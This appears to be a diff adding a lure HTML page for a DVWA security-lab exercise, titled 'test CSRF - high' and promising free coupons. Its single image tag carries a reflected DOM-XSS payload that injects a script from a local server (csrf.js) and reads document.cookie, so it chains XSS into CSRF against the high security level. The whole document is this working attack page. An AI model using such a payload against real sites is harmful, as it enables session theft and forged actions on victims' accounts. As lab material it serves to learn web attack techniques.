@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>test CSRF - high</title>
+</head>
+<body>
+You got free coupons 💸💸💸
+<img src="http://dvwa.localtest/vulnerabilities/xss_d/?default=English<script src='http://127.0.0.1:8080/csrf.js'>console.log(document.cookie)</script>&default=English#">
+</body>
+</html>
